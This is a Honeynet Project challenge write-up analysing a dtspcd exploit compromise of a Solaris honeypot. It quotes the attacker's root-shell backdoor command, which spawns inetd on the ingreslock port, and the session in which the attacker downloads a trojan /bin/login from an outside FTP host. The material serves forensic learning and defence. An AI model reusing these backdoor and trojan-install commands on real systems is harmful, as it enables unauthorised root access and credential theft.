<html><head>
<title>Honeynet Project Challenge of the month  Scan 20</title></head>

<body>

<p><b>Honeynet Project Challenge of the month</b></p>
<p><b><a href="mailto:nard@nardware.co.uk">nard@nardware.co.uk</a><br>
UK<br>
</b><br>
<u>Scan 20, to investigate a compromise of a Solaris box by using the dtspcd 
exploit.</u><br>
 </p>
<p>Download the binary log and  check its md5sum<br>
 </p>
<blockquote>
  <p>
  <font face="Courier New" size="2">[nard@localhost honey]$ md5sum 
  ./0108\@000-snort.log.tar.gz <br>
  612be364f54ca5fcb47cf70e69419175 <a href="mailto:./0108@000-snort.log.tar.gz">./0108@000-snort.log.tar.gz</a><br>
  Sum is ok.....<br>
  So extract the archive.....<br>
  [nard@localhost honey]$ tar -zxvf ./0108\@000-snort.log.tar.gz </font></p>
</blockquote>
<p><font face="Courier New" size="2"><br>
</font>Run the log through snort and see what comes up....</p>
<blockquote>
  <p><font face="Courier New" size="2">[nard@localhost honey]$snort -r 
  0108\@000-snort.log -A full -c ./snort-1.8.4/snort.conf</font></p>
</blockquote>
<p>We immediately see some interesting alerts generated in the snort alert log..</p>
<blockquote>
  <p><font face="Courier New" size="2">root@rfc1918-host snort]# cat ./alert <br>
  [**] [100:1:1] spp_portscan: PORTSCAN DETECTED from 218.7.3.19 (THRESHOLD 4 
  connections exceeded in 0 seconds) [**] 04/01-20:28:40.986548 <br>
  <br>
  <b>---- SNIP------</b><br>
  <br>
  [**] [100:3:1] spp_portscan: End of portscan from 208.61.69.153: TOTAL<br>
  time(3s) hosts(9) TCP(9) UDP(0) [**]<br>
  04/01-20:28:40.994573 <br>
  <br>
  [**] [1:1398:4] EXPLOIT CDE dtspcd exploit attempt [**]<br>
  [Classification: Misc Attack] [Priority: 2] 01/08-15:46:04.378306 
  208.61.1.160:3592 -&gt; 172.16.1.102:6112 TCP TTL:48 TOS:0x0 ID:41388 IpLen:20 
  DgmLen:1500 DF<br>
  ***AP*** Seq: 0xFEE2C115 Ack: 0x5F66192F Win: 0x3EBC TcpLen: 32 TCP Options 
  (3) =&gt; NOP NOP TS: 463986683 4158792 <br>
  [Xref =&gt; http://cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2001-0803]<br>
  [Xref =&gt; http://www.cert.org/advisories/CA-2002-01.html]<br>
  <br>
  <b>---- SNIP ----</b><br>
  <br>
  [**] [1:716:2] TELNET access [**]<br>
  [Classification: Not Suspicious Traffic] [Priority: 3] 01/08-15:47:50.816448 
  172.16.1.102:23 -&gt; 66.156.236.56:4065 TCP TTL:63 TOS:0x0 ID:43435 IpLen:20 
  DgmLen:67 DF<br>
  ***AP*** Seq: 0x613B729D Ack: 0x52F4F074 Win: 0x640C TcpLen: 32 TCP Options 
  (3) =&gt; NOP NOP TS: 4169462 985388 <br>
  [Xref =&gt; http://www.whitehats.com/info/IDS08]<br>
  [Xref =&gt; http://cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-1999-0619]<br>
  <br>
  [**] [100:1:1] spp_portscan: PORTSCAN DETECTED from 211.152.65.34 (THRESHOLD 4 
  connections exceeded in 0 seconds) [**] 04/01-20:28:41.032414 <br>
  <br>
  <b>---- SNIP----</b><br>
  <br>
  [**] [100:1:1] spp_portscan: PORTSCAN DETECTED from 195.174.97.101 (THRESHOLD 
  4 <br>
  connections exceeded in 0 seconds) [**]<br>
  04/01-20:28:41.034567 <br>
  <br>
 </font></p>
</blockquote>
<p align="left">Well these alerts basically explain themselves, we will go into 
them deeper later, so now onto the questions...</p>
<blockquote>
  <p align="left"><br>
  <b>
  <u>Q 1  What is a NOP slide and how is this one different from the NOP 
  slide in the rpc.statd exploit in Scan10? <br>
 </u></b></p>
</blockquote>
<p>NOP Command: A Null instruction, effectively does nothing, used in assembly 
for small timing pauses.<br>
Note: This is not to be confused with a NOP TCP option, for padding out the 
Options section of a TCP header with nulls to fill it to the correct size.<br>
<br>
When writing a piece of assembly code to exploit an unchecked buffer, finding 
the correct offset even when you know where the start of the stack is can be more 
than a tricky thing to do. Guesswork just doesn't cut it. One method of largely 
increasing the chances of getting the pointer to the beginning of the exploit 
code is to pad around it  with NOP instructions. If the return address 
points somewhere in this large series of NOP instructions they will be stepped 
through (or slide through)  until the start of the exploit code it met.</p>
<blockquote>
  <p><br>
  <b>
  <u>Q 2) The attack was on 08 Jan, 2002. Would Snort have generated an alert 
  then for the attack? </u></b></p>
</blockquote>
  <p><u><br>
  </u>Yes an alert would have been generated by the exploit, obviously not the 
  alert shown at the start of this report, but this exploit also triggers the  SHELLCODE" 
  sparc NOOP" alert.</p>
<blockquote>
  <p><b><u>Q 3) In the exploit code, the command "/bin/sh sh -i" is given, what is 
  its purpose, and why is 'sh' shown twice? <br>
 </u></b></p>
</blockquote>
<p><font face="Courier New" size="2">/bin/ksh -c echo ?ingreslock stream tcp 
nowait root /bin/sh sh -i"&gt;/tmp/x;/usr/sbin/inetd -s /tmp/x;sleep 10;/bin/rm -f 
/tmp/x" <br>
 </font></p>
<p>The above command can be observed being sent to the honeypot from host 
"adsl-61-1-160.dab.bellsouth.net". Below is a step by step walkthrough of how it 
effects operation of the target.</p>
<p>The command can be split into sections for easier understanding and 
explanation.</p>
<blockquote>
  <p align="left"><font face="Courier New" size="2">#1 /bin/ksh -c <br>
  #2 echo "ingreslock stream tcp nowait root /bin/sh sh -i" &gt; /tmp/x <br>
  #3 /usr/sbin/inetd -s /tmp/x<br>
  #4 sleep 10<br>
  #5 /bin/rm -f /tmp/x</font></p>
</blockquote>
<p>    Line explanation.<br>
<br>
#1 ksh is an interactive shell for UNIX systems, by appending the command  
with the "-c" option, it will then execute any further arguments that are 
passed as commands.<br>
#2 echo will "echo" any string passed to it, by default to standard output. 
The output 
can, and is, redirected to a new file named "x" that is created in "/tmp". <br>
<font face="Courier New" size="2"><br>
ingreslock stream tcp nowait root /bin/sh sh -i<br>
<br>
</font>This is a formatted line for the configuration file for inetd 
(inetd.conf).  inetd is the "Internet Daemon" / "Super service", it 
monitors incoming IP traffic and when packets arrive on specified ports it will 
spawn the corresponding service to communicate with it. A normal inetd 
configuration file will look a (very) little like the example below.<br>
 </p>
<blockquote>
  <p><font face="Courier New" size="2">#sample (and somewhat strange) inetd.conf 
  file<br>
  #(1)     (2)       (3)    
  (4)       (5)     (6)               
  (7)<br>
  pop-3    stream    tcp    nowait    
  root    /usr/sbin/tcpd    ipop3d<br>
  ftp      stream    tcp    
  nowait    root    /usr/etc/ftpd     
  ftpd<br>
  </font><br>
 </p>
</blockquote>
<p>The inetd.conf file  can be read as if it was in rows and columns, each 
row corresponds to a new entry for a new service the machine offers, the columns 
specify the following information.</p>
<p>(1) The port to expect the incoming traffic on, this can be in the form of 
"Service Name" and should be listed in /etc/services. This can also be specified 
as a port number.<br>
(2) What type of socket connection is expected, stream or datagram<br>
(3) Is the incoming data going to be UDP or TCP Packets<br>
(4) Is the service interactive, i.e. should it make further clients wait for a 
connection<br>
(5) The UID the daemon should run as<br>
(6) The daemon/program to be used<br>
(7) The actual command to execute the daemon including any arguments.<br>
<br>
<font face="Courier New" size="2">    ingreslock stream tcp 
nowait root /bin/sh sh -I<br>
</font><br>
With the above line being read by inetd it would have the ability spawn an 
interactive shell with root privileges. Every time a terminal emulator (eg 
telnet) connects to the system on the TCP port used by ingreslock, the 
user would receive a shell prompt.<br>
 </p>
<p>#3 The user then spawns another copy of inetd specifying what file to read 
for its configuration.</p>
<p> <font face="Courier New" size="2">/usr/sbin/inetd -s /tmp/x</font></p>
<p>we now have a copy of inetd that will automatically launch a root shell to 
anyone who connects.</p>
<p><br>
<b>
<u>Q 4) The attacker executed a variety of commands on the hacked Solaris box. 
Which commands were automated by the exploit, which commands were manual by the 
attacker himself? <br>
 </u></b></p>
<p>Using Ethereal and tcpstream we can extract and view what the unauthorized 
user did on the system, I would think that the below command was automated by 
the exploit.</p>
<p>Automatic exploit command (and server responses).</p>
<blockquote>
  <p><font face="Courier New" size="2">#uname -a;ls -l /core /var/dt/tmp/DTSPCD.log;PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/ccs/bin:/usr/gnu/bin;export 
  PATH;echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print 
  $2}'`<br>
  <br>
    SunOS buzzy 5.8 Generic_108528-03 sun4u sparc SUNW,Ultra-5_10<br>
  <br>
    /core: No such file or directory<br>
  <br>
    /var/dt/tmp/DTSPCD.log: No such file or directory<br>
  <br>
    BD PID(s): 3476<br>
  <br>
    8:47am up 11:24, 0 users, load average: 0.12, 0.04, 0.02<br>
  <br>
    User tty login@ idle JCPU PCPU what<br>
 </font></p>
</blockquote>
<p>I believe this command was scripted  by the exploit, such a long command is 
rarely typed in in one go without any mistakes or "\" characters. Its 
purpose is to present system information to the user that compromised the box.<br>
 </p>
<blockquote>
  <p>These are the commands that were then executed  by the user (and include the 
  target responses)<br>
  <br>
  <font face="Courier New" size="2">#cd /tmp<br>
  #mkdir /usr/lib<br>
  mkdir: Failed to make directory "/usr/lib"; File exists<br>
  <br>
  #mv /bin/login /usr/lib/libfl.k<br>
  # ftp 64.224.118.115<br>
  ftp: ioctl(TIOCGETP): Invalid argument<br>
  220 widcr0004atl2.interland.net FTP server (Version wu-2.6.2(1) Tue Jan 8 
  07:50: 31 EST 2002) ready.<br>
  &gt;USER ftp<br>
  331 Guest login ok, send your complete e-mail address as password.<br>
  &gt;PASS a@<br>
  230 Guest login ok, access restrictions apply.<br>
  &gt;CWD pub<br>
  250 CWD command successful.<br>
  &gt;TYPE I<br>
  200 Type set to I.<br>
  &gt;PORT 176,16,1,102,130,234<br>
  200 PORT command successful.<br>
  &gt;RETR sun1<br>
  150 Opening BINARY mode data connection for sun1 (90544 bytes). 226 Transfer 
  complete.<br>
  &gt;QUIT<br>
  221-You have transferred 90544 bytes in 1 files.<br>
  221-Total traffic for this session was 91042 bytes in 1 transfers. 221-Thank 
  you for using the FTP service on widcr0004atl2.interland.net. 221 Goodbye. <br>
  #ls sun1<br>
  sun1 <br>
  #chmod 555 sun1 <br>
  #mv sun1 /bin/login</font></p>
</blockquote>
<p><br>
<br>
<b>
<u>Q 5) What is sun1, and how does it work? </u></b></p>
<p><br>
    In the last commands the malicious user executed, we can see 
that they have made the file "sun1" executable and replaced /bin/login with it. This 
 
is likely to be a Trojan version of /bin/login. Although I managed to 
extract the sun1 binary, I do not have a machine available to have a play with 
it and therefore cannot confirm my theories. I am sure it would capture usernames 
and passwords allowing him to expand his influence in some way.<br>
<br>
<b>
<u>Q 6) What did you learn from this exercise? </u></b></p>
<p><br>
Basically Sh*t loads! Even if my opinions are totally incorrect,  this 
exercise has acted as a huge learning project for me. I would like to take this 
opportunity to thank you  guys for providing such a useful resource for 
people to learn so much information through. Please keep up with these 
challenges! With the current self centred and egotistical views of most White, 
grey <i>and</i> black hats out there, learning these technologies, processes and 
ideas without spending s*&amp;t  lots of £$ on courses is a very tricky task. 
Although there are many good books in circulation actually having real 
challenges to do is a great tool.<br>
Can't wait for the next one.</p>
<p><b><u>Bonus Question:<font face="Arial, Helvetica, sans-serif" size="2"> </font>
</u></b></p>
<blockquote>
  <p><font face="Arial, Helvetica, sans-serif" size="2">One of the commands 
  executed during the attack is<br>
  </font><font size="2" face="Courier New">echo "BD PID(s): "`ps -fed|grep ' -s 
  /tmp/x'|grep -v grep|awk '{print $2}'` </font>
  <font face="Arial, Helvetica, sans-serif" size="2"><br>
  What is the purpose of this command and what does 'BD' stand for? </font></p>
</blockquote>

<p>Firstly to explain this, lets break this hard to read command down into 
sections.</p>
<p><u><font face="Courier New" size="2">ps -fed|</font></u><br>
ps is the command to list current processes on a machine<br>
-f = Full Listing<br>
-e = list Every Process running<br>
-d = List all processes except session headers</p>
<p><font face="Courier New" size="2"><u>grep '-s /tmp/x'</u><br>
</font>grep is  a UNIX command to find patterns in files<br>
<font face="Courier New" size="2">grep '-s /tmp/x'</font> will search for '-s 
/temp/x'<br>
<font face="Courier New" size="2">grep -v</font> will tell grep to ignore 
certain patterns.</p>
<p>awk is a command language that works with files and data presentation.</p>
<p><font size="2" face="Courier New">awk '{print $2}' will print the information 
in the second column</font></p>
<p>If we put all this together we get (<u>in pseudo commands</u>)</p>
<blockquote>
  <p><font face="Courier New" size="2">echo "Back Door Process Id's" |Show all 
  process's| list the processes that contain '-s /tmp/x' | ignore any process 
  that contain 'grep' | echo the information returned in the second column only.</font></p>
</blockquote>
<p>This will echo the process id of the malicious copy of inetd that is running, 
in the case of this intrusion the following was returned</p>
<p><font face="Courier New" size="2">    BD PID(s): 3476</font></p>
<p>BD will more than likely stand for "Back Door", </p>
<p><u><b>Q 7) How long did this challenge take you? <br>
</b>
<br>
</u>A Long time, as you may have guessed I am not a full time security 
professional and by no means an expert. I'm just another 23 year old kid 
attempting (and failing) to find employment  in the security field.</p>
<p>Anyway enough of that bull!</p>
<p>Downloading, extracting, snorting and having a quick look at the bin capture.
<br>
1 Hour</p>
<p>Q1) Quite a while, went off on the wrong path, as soon as a spotted the word 
NOP, thought it was referring to TCP Headers, as soon as I stood back and looked at 
the wider picture and noticed all of the x90 instructions passed in scan 10.<br>
2 Hours<br>
 </p>
<p>Q2) 10 mins<br>
 </p>
<p>Q3) This is a simple one (probably means have it wrong), <br>
about 30 mins <br>
 </p>
<p>Q4) This was the fun bit, spent a long time on this.<br>
2.5 Hours (but it was fun using TCPStream and Ethereal in different ways than i 
would normally)<br>
 </p>
<p>Q5) Without a Sun box to play around with, this is a quick assumption. <br>
5 mins<br>
 </p>
<p>Write-up and confirming a few more theories, <br>
2 Hours</p>
<p>Bonus question<br>
10 mins</p>
<p>Total : ~ 9 Hours split over a few evenings, lunch breaks and beers.<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
 </p>

</body></html>